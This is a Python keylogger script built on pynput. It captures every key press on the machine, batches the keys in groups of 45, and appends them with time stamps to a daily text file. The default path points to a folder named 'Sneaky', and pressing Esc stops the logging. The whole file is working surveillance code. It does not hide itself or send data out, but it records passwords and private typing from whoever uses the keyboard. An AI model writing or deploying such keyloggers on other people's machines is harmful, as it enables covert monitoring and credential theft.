import sys
import time
import os
from time import gmtime, strftime

# pynput Module that logs user key presses
from pynput import keyboard
from pynput.keyboard import Key, Listener

path = "C:\\Users\\brock\\Desktop\\Sneaky"     #Create this path if it does not exist already

def main():
    global path
    args = sys.argv[1:]
    if len(args) != 0:          #Cant override path with no argument - out of bounds error
        path = args[0]
    #Listens for key events
    #Functions that are called when a key is called or released
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


class dataSegmant:
    def __init__(self):
        self.text = []
        self.time = self.getHourMinute()

    def clear(self):
        self.text = []

    # Will be used to initialize time increments in text file
    # Example: 11:38AM
    def getHourMinute(self):
        hourTime = strftime("%H")
        concat = ""
        if hourTime >= "12":
            concat = "PM"
        if hourTime < "12":
            concat = "AM"
        return strftime("%H:%M" + concat)

    def appendKeyData(self, key):
        self.text.append(key)

data = dataSegmant()



def writeFile(data):
    #creates new file based on
    global path
    ds = dataSegmant()

    # Make new Folder "Sneaky" if not made already  [Errno 13] Permission denied:
    # if not os.path.exists(path):
    #     os.makedirs(path)
    # with(open(path)):
    with open(getDate(), "a") as f:  # Creates a new file based upon date and as f is append mode
        # f.write(getDate())
        f.write(ds.getHourMinute())
        f.write("\n")
        for key in data.text:
            k = str(key).replace("'", "")  # Removes quotation marks
            if k.find("space") > 0:  # Looks for spaces, defaults make it harder to read
                f.write(" ")  # Makes a space
            elif k.find("Key") == -1:  # Looks for other commands (Backspace etc)
                f.write(k)  # Writes the actual key
        f.write("\n")


def getDate():
    date = "%Y-%m-%d"
    return(strftime(date + ".txt"))

data = dataSegmant()
count = 45

def on_press(key):
    global data,count
    if(count == 0):
        writeFile(data)
        count = 45
        data.clear()
        data.appendKeyData(key)
    else:
        data.appendKeyData(key)
        count -= 1

def on_release(key):
    global data
    if key == Key.esc:
        writeFile(data)
        return False

main()




